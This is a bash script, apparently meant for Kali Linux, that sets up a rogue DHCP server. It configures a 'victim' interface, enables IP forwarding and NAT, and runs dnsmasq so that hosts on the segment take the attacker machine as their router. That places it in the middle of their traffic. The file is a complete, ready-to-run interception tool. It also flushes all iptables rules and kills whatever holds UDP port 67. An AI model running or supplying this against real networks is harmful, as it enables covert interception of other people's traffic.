#!/bin/bash

# --- Configuration ---
VICTIM_IFACE="eth1" # Specifies the interface that is connected to victim hosts
INTERNET_IFACE="eth0" # Specifies the interface that is connected to the internet
IP_ADDR="192.168.2.1" # Specifies the IP address on eth1 on Kali Linux
DHCP_RANGE="192.168.2.10,192.168.2.100,12h"

# 1. THE NUCLEAR CLEANUP FUNCTION
cleanup() {
    echo -e "\n\n[!] TRIGGERING NUCLEAR CLEANUP..."
    
    # Force kill any dnsmasq instance by Process ID
    sudo pkill -9 dnsmasq 2>/dev/null
    
    # Wipe iptables clean
    sudo iptables -F
    sudo iptables -X
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    
    # Disable forwarding
    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
    
    echo "[+] Cleanup complete. Port 67 is now free."
    exit 0
}

# 2. Trap multiple exit signals (Ctrl+C, Terminal Closed, Script Crash)
trap cleanup SIGINT SIGTERM SIGHUP EXIT

# 3. PRE-FLIGHT CHECK (Clear port 67 before starting)
echo "[*] Ensuring Port 67 is free..."
sudo fuser -k 67/udp 2>/dev/null # This kills WHATEVER is using the DHCP port
sudo systemctl stop dnsmasq 2>/dev/null

# 4. NETWORK CONFIG
echo "[*] Configuring $VICTIM_IFACE..."
sudo ifconfig $VICTIM_IFACE $IP_ADDR netmask 255.255.255.0 up

echo "[*] Enabling IP Forwarding & NAT..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A POSTROUTING -o $INTERNET_IFACE -j MASQUERADE
sudo iptables -A FORWARD -i $VICTIM_IFACE -o $INTERNET_IFACE -j ACCEPT

# 5. EXECUTION
echo "[*] Starting Rogue DHCP Server... [Press Ctrl+C to stop]"
# Running in foreground so 'trap' can catch the signal
sudo dnsmasq -d -k -i $VICTIM_IFACE \
    --dhcp-range=$DHCP_RANGE \
    --dhcp-option=option:router,$IP_ADDR \
    --dhcp-option=option:dns-server,8.8.8.8
